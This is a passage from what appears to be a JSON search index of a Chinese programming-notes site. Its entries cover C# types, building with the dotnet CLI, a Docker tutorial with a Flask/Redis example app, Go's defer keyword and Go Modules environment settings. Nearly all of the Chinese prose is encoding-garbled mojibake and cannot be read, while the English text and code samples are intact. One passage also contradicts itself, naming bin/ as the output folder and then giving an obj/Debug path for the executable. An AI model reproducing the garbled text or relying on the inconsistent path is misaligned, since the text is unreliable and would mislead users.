åŠ¨æ€ç±»å‹ï¼ŒåŠ¨æ€ç±»å‹çš„å˜é‡å¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„å€¼ã€‚è¿™äº›å˜é‡çš„ç±»å‹æ£€æŸ¥åœ¨è¿è¡Œæ—¶å‘ç”Ÿã€‚\ndynamic dyn = value;\t// å£°æ˜åŠ¨æ€ç±»å‹å˜é‡   string å­—ç¬¦ä¸²ç±»å‹ã€‚å­—ç¬¦ä¸²æœ‰ä¸¤ç§å£°æ˜æ–¹å¼ï¼Œæ™®é€šå¼•å·å£°æ˜ä¸ @ å¼•å¯¼å£°æ˜ã€‚\nString str1 = \u0026#34;Hello World\u0026#34;; // æ™®é€šå¼•å¯¼å£°æ˜ï¼Œä¸ C++ è¯­æ³•ç›¸åŒ  String str2 = @\u0026#34;script type=\u0026#34;\u0026#34;text/javascript\u0026#34;\u0026#34;\u0026gt; \u0026lt;!-- --\u0026gt; \u0026lt;/script\u0026gt;\u0026#34;;\t// @å¼•å¯¼å£°æ˜ï¼Œå¯ä»¥ç›´æ¥å†™å…¥ \\,\\n è¿™äº›å­—ç¬¦   æŒ‡é’ˆç±»å‹ #  æŒ‡é’ˆç±»å‹å˜é‡å­˜å‚¨å¦ä¸€ç§ç±»å‹çš„å†…å­˜åœ°å€ã€‚C# ä¸­çš„æŒ‡é’ˆä¸ C æˆ– C++ ä¸­çš„æŒ‡é’ˆæœ‰ç›¸åŒçš„åŠŸèƒ½ã€‚\n"},{"id":15,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/","title":"ä»é›¶å¼€å§‹","section":"C#","content":" å‚è€ƒæ–‡æ¡£ï¼š\n  https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-restore\n  https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-msbuild\n   ä»é›¶å¼€å§‹ #   å¦‚ä½•ä»é›¶å¼€å§‹ï¼Œä½¿ç”¨å‘½ä»¤è¡Œæ„å»ºå¹¶è¿è¡Œä¸€ä¸ª C# çš„é¡¹ç›®ï¼Œå¹¶ä¸”è¿è¡Œä¸€ä¸ªç¨‹åºï¼Ÿ\n é¡¹ç›®ç»“æ„ #  è¿è¡Œä¸€ä¸ªé¡¹ç›®è‡³å°‘éœ€è¦ä¸€ä¸ª xml æ ¼å¼çš„é¡¹ç›®æ–‡ä»¶ {é¡¹ç›®å}.csproj å’Œä¸€ä¸ªæºä»£ç æ–‡ä»¶ {æ–‡ä»¶å}.csã€‚äº†è§£è¿™ä¸ªï¼Œæœ‰åŠ©äºæˆ‘ä»¬ä½¿ç”¨ git ç®¡ç†è‡ªå·±çš„é¡¹ç›®ä»£ç ã€‚\næˆ‘ä»¬åœ¨ Visual Studio é‡Œé¢åˆ›å»ºä¸€ä¸ª .Net åœ¨ Windows ä¸Šçš„æ¡Œé¢æ§åˆ¶å°åº”ç”¨ã€‚\nä¸‹é¢æ˜¯å®˜æ–¹é»˜è®¤ç”Ÿæˆçš„ HelloWorld.csprojï¼š\n\u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk\u0026#34;\u0026gt;   \u0026lt;PropertyGroup\u0026gt;  \u0026lt;OutputType\u0026gt;Exe\u0026lt;/OutputType\u0026gt;  \u0026lt;TargetFramework\u0026gt;netcoreapp3.1\u0026lt;/TargetFramework\u0026gt;  \u0026lt;/PropertyGroup\u0026gt;  \u0026lt;/Project\u0026gt;  è¿™ä¸ªæ˜¯é¡¹ç›®çš„é…ç½®ä¿¡æ¯ ä¸Šé¢è¿™ä¸ª xml æŒ‡æ˜äº†é¡¹ç›®ä½¿ç”¨çš„ SDKï¼ˆMicrosoft.NET.Sdkï¼‰ã€è¾“å‡ºçš„æ–‡ä»¶ç±»å‹ï¼ˆå¯æ‰§è¡Œ exe æ–‡ä»¶ï¼‰ã€.NET ç‰ˆæœ¬ã€‚  ä¸‹é¢æ˜¯å®˜æ–¹é»˜è®¤ç”Ÿæˆçš„ Program.csï¼š\nusing System;  namespace HelloWorld {  class Program  {  static void Main()  {  Console.WriteLine(\u0026#34;Hello World!\u0026#34;);  }  } }  è¯¦ç»†çš„è¯­è¨€è¯­æ³•ç»†èŠ‚åœ¨è¿™é‡Œä¸é˜è¿°ã€‚  è¿è¡Œ #  é™¤äº†åœ¨ Visual Studio ä¸­ç‚¹å‡»æ‰§è¡Œä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±ä½¿ç”¨å‘½ä»¤è¡Œè‡ªå·±ç¼–è¯‘å¹¶ä¸”æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚\nC# çš„å‘½ä»¤è¡ŒæŒ‡ä»¤æ˜¯ dotnetï¼Œè¿è¡Œä¸€ä¸ªé¡¹ç›®åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š\n  æ¢å¤ï¼Œä½¿ç”¨ NuGet æ¢å¤é€šè¿‡åœ¨é¡¹ç›®æ–‡ä»¶ä¸­æŒ‡å®šçš„é¡¹ç›®çš„ä¾èµ–é¡¹ã€‚æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼ŒNuGet å°±ä¼šä¸ºæˆ‘ä»¬æ¢å¤ SDK ä¸­çš„å†…å®¹ã€‚åœ¨é¡¹ç›®ä»£ç åŒçº§ç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n$ dotnet restore æ‰§è¡Œå®Œè¿™ä¸ªå‘½ä»¤åï¼Œä¼šå‘ç°ç›®å½•ä¸‹å‡ºç°äº† obj/ è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ€å…³é”®çš„æ–‡ä»¶æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­çš„ project.assets.jsonã€‚\n  ç¼–è¯‘ï¼Œç¼–è¯‘çš„æŒ‡ä»¤æ˜¯ msbuildï¼š\n$ dotnet msbuild è¿™ä¸ªæ˜¯ dotnet æä¾›çš„æœ€ä¸‹å±‚çš„å‘½ä»¤ï¼Œå…è®¸æŒ‡å®šå®Œå¤‡çš„ç¼–è¯‘é€‰é¡¹ã€‚\n  è¿è¡Œã€‚ç¼–è¯‘æŒ‡ä»¤é»˜è®¤ä¼šæŠŠå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨ bin/\u0026lt;configuration\u0026gt;/\u0026lt;target\u0026gt; ä¸­ï¼Œæ¯”å¦‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä¼šæŠŠå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨ obj/Debug/netcoreapp3.1/HelloWorld.exeï¼Œäºæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼š\n$ ./obj/Debug/netcoreapp3.1/HelloWorld.exe   å¦å¤–ï¼Œdotnet æä¾›äº†ä¸€äº›æ›´åŠ ä¾¿æ·çš„å‘½ä»¤ï¼š\n  build å‘½ä»¤ä¼šéšå¼æ‰§è¡Œ restore ä¹‹åï¼Œæ‰§è¡Œ msbuildï¼š\n$ dotnet build # Equivalent To: # dotnet msbuild -restore   run å‘½ä»¤ä¼šéšå¼æ‰§è¡Œ restoreã€msbuild ä¹‹åæ‰§è¡Œè¿è¡Œæ“ä½œï¼š\n$ dotnet run ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æœ‰é¡¹ç›®æ–‡ä»¶ä¸æºä»£ç ï¼Œç›´æ¥æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å³å¯è¿è¡Œã€‚\n  "},{"id":16,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/1.orientation/","title":"1. Orientation","section":"Docker","content":"Part 1: Orientation and setup #  Docker æ¦‚å¿µ #  What is docker? #  Docker is a platform for developers and sysadmins to develop, deploy, and run applications with containers. The use of Linux containers to deploy applications is called containerization.\nContainerization is increasingly popular because containers are:\n Flexible, Lightweight, Interchangeable, Portable, Scalable, Stackable  Images and Containers #    Imageï¼šåŒ…å«æ‰€æœ‰è¿è¡Œä¸€ä¸ªç¨‹åºæ‰€éœ€ç¯å¢ƒçš„å¯æ‰§è¡ŒåŒ…ã€‚æ¯”å¦‚ï¼šå…¶ä¸­çš„ä»£ç ï¼Œåº“æ–‡ä»¶ï¼Œç¯å¢ƒå˜é‡ï¼Œé…ç½®æ–‡ä»¶ç­‰ç­‰ã€‚ä¸€ä¸ª container é€šè¿‡è¿è¡Œä¸€ä¸ª image å¯åŠ¨ã€‚\n  containersï¼šè¿è¡Œä¸€ä¸ª image çš„å®ä¾‹ï¼Œæˆ–è€…è¯´ä¸€ä¸ªæ‹¥æœ‰çŠ¶æ€å’Œç”¨æˆ·è¿›ç¨‹çš„ imageã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®ä¾‹ï¼š\n$ docker ps   Containers and Virtual machines #    A container runs natively on Linux and shares the kernel of the host machine with other containers. It runs a discrete process, taking no more memory than any other executable, making it lightweight.\n  By contrast, a virtual machine (VM) runs a full-blown â€œguestâ€ operating system with virtual access to host resources through a hypervisor. In general, VMs provide an environment with more resources than most applications need.\n  æµ‹è¯• Docker çš„ç‰ˆæœ¬ #  é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹ docker çš„ç‰ˆæœ¬ï¼š\n$ docker --version Docker version 17.12.1-ce, build 7390fc6  # view even more details about your docker installation with following command: $ docker info Containers: 0  Running: 0  Paused: 0  Stopped: 0 Images: 0 ... æµ‹è¯• Docker çš„å®‰è£… #  ä»¥ä¸‹çš„å‘½ä»¤ä¼šè‡ªåŠ¨è¿è¡Œä¸€ä¸ªæµ‹è¯• imageï¼Œè‹¥æœªå®‰è£…ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨ä¸‹è½½é•œåƒï¼š\n$ docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world d1725b59e92d: Pull complete Digest: sha256:0add3ace90ecb4adbf7777e9aacf18357296e799f81cabc9fde470971e499788 Status: Downloaded newer image for hello-world:latest ... é€šè¿‡ä¹‹å‰çš„æŸ¥çœ‹å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ° hello-world è¿™ä¸ª image å·²ç»è¢«å®‰è£…åˆ°äº†æœºå™¨ä¸Šï¼š\n$ docker image ls List the hello-world container (spawned by the image) which exits after displaying its message. If it were still running, you would not need the --all option:\n$ docker container ls --all å‘½ä»¤æ€»ç»“ #  ## List Docker CLI commands docker docker container --help  ## Display Docker version and info docker --version docker version docker info  ## Execute Docker image docker run hello-world  ## List Docker images docker image ls  ## List Docker containers (running, all, all in quiet mode) docker container ls docker container ls --all docker container ls -aq "},{"id":17,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/2.containers/","title":"2. Containers","section":"Docker","content":"Part 2: Containers #  We start at the bottom of the hierarchy of such an app, which is a container, which we cover on this page.\næ–°çš„å¼€å‘ç¯å¢ƒ Container #  In the past, if you were to start writing a Python app, your first order of business was to install a Python runtime onto your machine. But, that creates a situation where the environment on your machine needs to be perfect for your app to run as expected, and also needs to match your production environment.\nWith Docker, you can just grab a portable Python runtime as an image, no installation necessary. Then, your build can include the base Python image right alongside your app code, ensuring that your app, its dependencies, and the runtime, all travel together.\nThese portable images are defined by something called a Dockerfile.\nç”¨ Dockerfile å®šä¹‰ Container #  æ–‡ä»¶ Dockerfile å®šä¹‰äº†æ–‡ä»¶è¿›å…¥ container çš„è§„åˆ™ã€‚ä»¤ container åƒå‘ç½‘ç»œæ¥å£è¯·æ±‚æ•°æ®ä¸€æ ·å‘ host æœºå™¨è¯·æ±‚æ•°æ®ï¼Œå®ƒä¸ host å…¶ä»–ç¯å¢ƒå®Œå…¨åˆ†ç¦»ï¼Œæ‰€ä»¥ä½ éœ€è¦å®šä¹‰ä¸€ä¸ªç«¯å£æ˜ å°„åˆ° host çš„å¤–ç•Œå¹¶ä¸”å®šä¹‰å¯ä»¥è¿›å…¥ç¯å¢ƒçš„æ–‡ä»¶ã€‚è¿™äº›å†…å®¹éƒ½å¯ä»¥å†™åœ¨ Dockerfile è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚\nDockerfile #  ä¸€ä¸ªåŸºæœ¬çš„ Dockerfile ç¤ºä¾‹å¦‚ä¸‹ï¼š\n# Use an official Python runtime as a parent imageFROMpython:2.7-slim# Set the working directory to /appWORKDIR/app# Copy the current directory contents into the container at /appCOPY . /app# Install any needed packages specified in requirements.txtRUN pip install --trusted-host pypi.python.org -r requirements.txt# Make port 80 available to the world outside this containerEXPOSE80# Define environment variableENV NAME World# Run app.py when the container launchesCMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;]è¯¥ Dockerfile ä¸­æŒ‡æ˜äº† app.py å’Œ requirement.txt ä¸¤ä¸ªæ–‡ä»¶æœªåˆ›å»ºã€‚\nè¿™ä¸¤ä¸ªæ–‡ä»¶åªéœ€è¦åˆ›å»ºåœ¨ä¸ Dockerfile åŒçº§ç›®å½•ä¸‹ï¼Œä¸Šé¢çš„ COPY å‘½ä»¤ä¼šå°†å®ƒä»¬å¤åˆ¶åˆ°é•œåƒä¸­ï¼Œè€Œå…¶ä¸­çš„ EXPOSE åˆ™ä½¿æˆ‘ä»¬çš„ app.py å¯ä»¥é€šè¿‡ HTTP åè®®è®¿é—®åˆ°ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºå®ƒä»¬ã€‚\napp.py #  from flask import Flask from redis import Redis, RedisError import os import socket  # Connect to Redis redis = Redis(host=\u0026#34;redis\u0026#34;, db=0, socket_connect_timeout=2, socket_timeout=2)  app = Flask(__name__)  @app.route(\u0026#34;/\u0026#34;) def hello():  try:  visits = redis.incr(\u0026#34;counter\u0026#34;)  except RedisError:  visits = \u0026#34;\u0026lt;i\u0026gt;cannot connect to Redis, counter disabled\u0026lt;/i\u0026gt;\u0026#34;   html = \u0026#34;\u0026lt;h3\u0026gt;Hello {name}!\u0026lt;/h3\u0026gt;\u0026#34; \\  \u0026#34;\u0026lt;b\u0026gt;Hostname:\u0026lt;/b\u0026gt; {hostname}\u0026lt;br/\u0026gt;\u0026#34; \\  \u0026#34;\u0026lt;b\u0026gt;Visits:\u0026lt;/b\u0026gt; {visits}\u0026#34;  return html.format(name=os.getenv(\u0026#34;NAME\u0026#34;, \u0026#34;world\u0026#34;), hostname=socket.gethostname(), visits=visits)  if __name__ == \u0026#34;__main__\u0026#34;:  app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) requirement.txt #  Flask Redis è¿è¡Œä»¥ä¸‹å‘½ä»¤æµ‹è¯•ç¯å¢ƒæ˜¯å¦æ­£ç¡®ï¼š\n$ pip install -r requirement.txt ...  $ python app.py  * Serving Flask app \u0026#34;app\u0026#34; (lazy loading)  * Environment: production  WARNING: Do not use the development server in a production environment.  Use a production WSGI server instead.  * Debug mode: off  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit) æµè§ˆå™¨ä¸­è®¿é—® localhostï¼Œä¾¿å¯ä»¥çœ‹åˆ° soket.gethostname() çš„ç»“æœã€‚\næ­å»º app #  åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹è¿è¡Œä»¥ä¸‹å‘½ä»¤ build è¿™ä¸ªé¡¹ç›®ï¼ˆå…¶ä¸­ -t é€‰é¡¹æ˜¯ä¸ºäº†ç»™é•œåƒèµ·åå­—ï¼Œæ³¨æ„æœ€åçš„ . æŒ‡æ˜æ˜¯å½“å‰æ–‡ä»¶å¤¹ï¼‰ï¼š\n$ docker build -t test_image . å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹æ³¨å†Œåœ¨ Docker åå°çš„é•œåƒï¼š\n$ docker image ls Troubleshooting for Linux users #    ä»£ç†æœåŠ¡å™¨å¯èƒ½ä¼šç¦æ­¢ä½ çš„ web åº”ç”¨è¿æ¥ã€‚å¦‚æœä½ ä½¿ç”¨äº†ä»£ç†æœåŠ¡å™¨ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹åˆ° Dockerfile ä¸­ï¼Œå…¶ä¸­ ENV åæŒ‡æ˜ä»£ç†æœåŠ¡å™¨çš„ä¸»æœºåå’Œç«¯å£å·ï¼š\n# Set proxy server, replace host:port with values for your serversENV http_proxy host:portENV https_proxy host:port  DNS é…ç½®é”™è¯¯ä¼šå¯¼è‡´ pip å®‰è£…å‘½ä»¤å¤±è´¥ã€‚ä½ å¯èƒ½éœ€è¦æ›´æ”¹ Docker å®ˆæŠ¤è¿›ç¨‹çš„ DNS è®¾ç½®ã€‚ä½¿ç”¨ dns key ç¼–è¾‘ï¼ˆæˆ–åˆ›å»ºï¼‰æ–‡ä»¶ /etc/docker/daemon.json ï¼š\n{  \u0026#34;dns\u0026#34;: [\u0026#34;your_dns_address\u0026#34;, \u0026#34;8.8.8.8\u0026#34;] } ä¿å­˜ä¹‹åé‡å¯ docker æœåŠ¡å³å¯ï¼š\n$ sudo service docker restart   å¯åŠ¨ app #  é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æœåŠ¡ï¼ˆå…¶ä¸­ï¼Œ4000:80 æ„ä¸ºå°†æœºå™¨çš„ 4000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨å†…éƒ¨çš„ 80 ç«¯å£ï¼‰ï¼š\n$ docker run -p 4000:80 test_image åœ¨æµè§ˆå™¨ä¸­è®¿é—® localhost:4000 å¯ä»¥çœ‹åˆ° docker çš„è¿è¡Œç»“æœã€‚curl å‘½ä»¤ä¹Ÿæ˜¯åŒæ ·çš„æ•ˆæœã€‚\nCTRL+C åœæ­¢è¿è¡Œç¨‹åºï¼Œåœ¨ windows ç³»ç»Ÿä¸Šæˆ–è€… Linux åå°è¿è¡Œæ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å…ˆè·å– CONTAINER ID ååœæ­¢è¿è¡Œç¨‹åºï¼š\n$ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6ff52e6cfdbc test_image \u0026#34;python app.py\u0026#34; 10 seconds ago Up 8 seconds 0.0.0.0:4000-\u0026gt;80/tcp confident_hopper  $ docker container stop 6ff52e6cfdbc é€šè¿‡ detached modeï¼Œå¯ä»¥ä»¤ app åœ¨åå°è¿è¡Œï¼Œæ¯”å¦‚ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤ï¼š\n$ docker run -d -p 4000:80 test_image é•œåƒçš„å¯ç§»æ¤æ€§ #  é¦–å…ˆï¼Œå½“ä½ æƒ³è¦å°†å®¹å™¨éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶ï¼Œä½ éœ€è¦çŸ¥é“å¦‚ä½•å°†å®¹å™¨æ¨é€åˆ°æ³¨å†Œè¡¨ (registry)ã€‚\nA registry is a collection of repositories, and a repository is a collection of imagesâ€”sort of like a GitHub repository, except the code is already built. An account on a registry can create many repositories. The docker CLI uses Dockerâ€™s public registry by default.\nLog in with your Docker ID #  åœ¨ Docker å®˜ç½‘ https://hub.docker.com ä¸Šæ³¨å†Œè´¦æˆ·ï¼Œå¹¶ç”¨ä»¥ä¸‹çš„å‘½ä»¤åœ¨æœ¬åœ°æœºå™¨ä¸Šç™»é™†è´¦æˆ·ï¼š\n$ docker login Tag the image #  å°†æœ¬åœ°çš„ä¸€ä¸ªé•œåƒä¸æ³¨å†Œè¡¨ä¸Šçš„ä»“åº“å…³è”èµ·æ¥çš„æ–¹å¼æ˜¯ username/repository:tagã€‚tag æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æ¨èä½¿ç”¨ï¼Œå› ä¸ºå®ƒæ˜¯æ³¨å†Œè¡¨ç»™æ¯ä¸ªé•œåƒä¸€ä¸ªç‰ˆæœ¬åç§°çš„æœºåˆ¶ã€‚\nNow, put it all together to tag the image. Run docker tag image with your username, repository, and tag names so that the image uploads to your desired destination. The syntax of the command is:\n$ docker tag \u0026lt;image\u0026gt; \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; Run docker image ls to see your newly tagged image.\nPublish the image #  ä»¥ä¸‹çš„å‘½ä»¤å¯ä»¥ç”¨äºä¸Šä¼ ä»“åº“ï¼š\n$ docker push \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; Once complete, the results of this upload are publicly available. If you log in to Docker Hub, you see the new image there, with its pull command.\nPull and run the image from the remote repository #  ç°åœ¨ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤åœ¨ä»»ä½•ä¸€ä¸ªæœºå™¨ä¸Šè¿è¡Œä½ çš„ appï¼š\n$ docker run -p 4000:80 \u0026lt;username\u0026gt;/\u0026lt;repository\u0026gt;:\u0026lt;tag\u0026gt; å¦‚æœ image åœ¨æœ¬æœºå¹¶ä¸å¯ç”¨ï¼ŒDocker ä¼šè‡ªåŠ¨ä»è¿œç«¯æ‹‰å–é•œåƒã€‚\nå‘½ä»¤æ€»ç»“ #  docker build -t friendlyhello . # Create image using this directory\u0026#39;s Dockerfile docker run -p 4000:80 friendlyhello # Run \u0026#34;friendlyhello\u0026#34; mapping port 4000 to 80 docker run -d -p 4000:80 friendlyhello # Same thing, but in detached mode docker container ls # List all running containers docker container ls -a # List all containers, even those not running docker container stop \u0026lt;hash\u0026gt; # Gracefully stop the specified container docker container kill \u0026lt;hash\u0026gt; # Force shutdown of the specified container docker container rm \u0026lt;hash\u0026gt; # Remove specified container from this machine docker container rm $(docker container ls -a -q) # Remove all containers docker image ls -a # List all images on this machine docker image rm \u0026lt;image id\u0026gt; # Remove specified image from this machine docker image rm $(docker image ls -a -q) # Remove all images from this machine docker login # Log in this CLI session using your Docker credentials docker tag \u0026lt;image\u0026gt; username/repository:tag # Tag \u0026lt;image\u0026gt; for upload to registry docker push username/repository:tag # Upload tagged image to registry docker run username/repository:tag # Run image from a registry "},{"id":18,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/3.services/","title":"3. Services","section":"Docker","content":"Part 3: Services #  å…³äº Services #  In a distributed application, different pieces of the app are called â€œservicesâ€. For example, if you imagine a video sharing site, it probably includes a service for storing application data in a database, a service for video transcoding in the background after a user uploads something, a service for the front-end, and so on.\nServices are really just â€œcontainers in production.â€ A service only runs one image, but it codifies the way that image runsâ€”what ports it should use, how many replicas of the container should run so the service has the capacity it needs, and so on. Scaling a service changes the number of container instances running that piece of software, assigning more computing resources to the service in the process.\nLuckily itâ€™s very easy to define, run, and scale services with the Docker platform \u0026ndash; just write a docker-compose.yml file.\nç¬¬ä¸€ä¸ª docker-compose.yml æ–‡ä»¶ #  "},{"id":19,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/draveness/%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/","title":"å¸¸ç”¨å…³é”®å­—","section":"Draveness","content":"å¸¸ç”¨å…³é”®å­— #  defer #  å®ä¾‹ #  ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ defer çš„å®ä¾‹ï¼š\nfunc createPost(db *gorm.DB) error {  tx := db.Begin()  defer tx.Rollback()   if err := tx.Create(\u0026amp;Post{Author: \u0026#34;Draveness\u0026#34;}).Error; err != nil {  return err  }   return tx.Commit().Error } å¯è§å®ƒçš„ç”¨æ³•æ˜¯ï¼šdefer ä¹‹åæŒ‡å®šçš„è¯­å¥ï¼Œä¼šåœ¨æ•´ä¸ªå‡½æ•°æ‰§è¡Œç»“æŸçš„æ—¶å€™æ‰§è¡Œã€‚\n"},{"id":20,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/gomodules/","title":"Go Modules","section":"Golang","content":" å‚è€ƒèµ„æ–™ï¼šhttps://mp.weixin.qq.com/s/zo7zmEVXvxgr80n6H_49Mg\n Go Modules #  ä»€ä¹ˆæ˜¯ Go Modulesï¼Ÿ\n Golang çš„ä¾èµ–åº“è§£å†³æ–¹æ¡ˆï¼Œäº Go1.14 æ¨èåœ¨ç”Ÿäº§ç¯å¢ƒä¸Šä½¿ç”¨ï¼›  å…³äº GOPATH #  GOPATH æ˜¯ä¸€ä¸ª golang çš„è¯­è¨€ç¯å¢ƒå˜é‡ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æœ¬æœºçš„å€¼ï¼š\n$ go env GOPATH æŒ‡å‘ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„ä¸‹ï¼Œåº”è¯¥æœ‰ bin/ã€pkg/ã€src/ ä¸‰ä¸ªæ–‡ä»¶å¤¹ã€‚\nåœ¨ GOPATH æ¨¡å¼ä¸‹ï¼š\n åº”ç”¨çš„ä»£ç åº”è¯¥å­˜æ”¾åœ¨å›ºå®šçš„ç›®å½• $GOPATH/src ä¸‹ï¼› å¦‚æœæ‰§è¡Œ go get æ‹‰å–å¤–éƒ¨çš„ä¾èµ–ï¼Œä¼šå°†å…¶è‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£…åˆ° $GOPATH ç›®å½•ä¸‹ï¼›  GOPATH æ¨¡å¼çš„è‡´å‘½ç¼ºé™·ï¼šæ²¡æœ‰ç‰ˆæœ¬æ§åˆ¶çš„æ¦‚å¿µã€‚\nåœ¨ GOPATH æ¨¡å¼ä¸‹è¯ç”Ÿäº†è®¸å¤šä¾èµ–è§£å†³æ–¹æ¡ˆï¼švendor ç›®å½•æ¨¡å¼ï¼Œä¾èµ–å·¥å…· depï¼ŒGo 1.11 é‡Šæ”¾å‡º Go Modules å‰èº« vgoã€‚\nåŸºæœ¬ä½¿ç”¨ #  åœ¨ Go modules ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ“ä½œï¼š\n   å‘½ä»¤ ä½œç”¨     go mod init ç”Ÿæˆ go.mod æ–‡ä»¶   go mod download ä¸‹è½½ go.mod æ–‡ä»¶ä¸­æŒ‡æ˜çš„æ‰€æœ‰ä¾èµ–   go mod tidy æ•´ç†ç°æœ‰çš„ä¾èµ–   go mod graph æŸ¥çœ‹ç°æœ‰çš„ä¾èµ–ç»“æ„   go mod edit ç¼–è¾‘ go.mod æ–‡ä»¶   go mod vendor å¯¼å‡ºé¡¹ç›®æ‰€æœ‰çš„ä¾èµ–åˆ°vendorç›®å½•   go mod verify æ ¡éªŒä¸€ä¸ªæ¨¡å—æ˜¯å¦è¢«ç¯¡æ”¹è¿‡   go mod why æŸ¥çœ‹ä¸ºä»€ä¹ˆéœ€è¦ä¾èµ–æŸæ¨¡å—    åœ¨ Go Modules ä¸­æœ‰å¦‚ä¸‹å¸¸ç”¨çš„ç¯å¢ƒå˜é‡ï¼ˆåŒæ ·å¯ä»¥ç”¨ go env å‘½ä»¤æŸ¥çœ‹ï¼‰ï¼š\n  GO111MODULEï¼šæ˜¯å¦å¼€å¯ Go Modules çš„å¼€å…³ï¼Œæœ‰ä¸‰ä¸ªå€¼ã€‚auto è¡¨ç¤ºé€šè¿‡æ˜¯å¦å­˜åœ¨æ–‡ä»¶ go.mod æ–‡ä»¶åˆ¤æ–­ï¼Œon è¡¨ç¤ºå¯ç”¨ï¼Œoff è¡¨ç¤ºç¦ç”¨ï¼›\n  GOPROXYï¼šç”¨äºä½¿ Go åœ¨åç»­æ‹‰å–æ¨¡å—ç‰ˆæœ¬æ—¶èƒ½å¤Ÿè„±ç¦»ä¼ ç»Ÿçš„ VCS æ–¹å¼ï¼Œç›´æ¥é€šè¿‡é•œåƒç«™ç‚¹æ¥å¿«é€Ÿæ‹‰å–ã€‚å®ƒçš„é»˜è®¤å€¼æ˜¯ https://proxy.golang.org,directï¼›å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤åˆ‡æ¢æˆå›½å†…æºï¼š\n$ go env -w GOPROXY=https://goproxy.cn,direct   GOSUMDBï¼šä¸€ä¸ªè¿œç¨‹çš„ checksum æ•°æ®åº“ï¼Œé»˜è®¤æŒ‡å‘ sum.golang.orgï¼Œå®ƒåœ¨å›½å†…ä¹Ÿæ˜¯æ— æ³•è®¿é—®çš„ï¼Œä½†æ˜¯å®ƒå¯ä»¥è¢« GOPROXY æ‰€ä»£ç†ï¼›\n  GONOPROXY/GONOSUMDB/GOPRIVATEï¼šåŠŸèƒ½ä¸å‰ä¸‰è€…ç±»ä¼¼ï¼Œä¸€èˆ¬ç”¨äºå½“å‰é¡¹ç›®çš„ä¾èµ–äº†ç§æœ‰æ¨¡å—ã€‚ä¸€èˆ¬å»ºè®®ç›´æ¥è®¾ç½® GOPRIVATEï¼Œå®ƒçš„å€¼å°†ä½œä¸º GONOPROXY å’Œ GONOSUMDB çš„é»˜è®¤å€¼ï¼š\n$ go env -w GOPRIVATE=\u0026#34;git.example.com,github.com/eddycjy/mquote\u0026#34;   go.mod æ–‡ä»¶ #  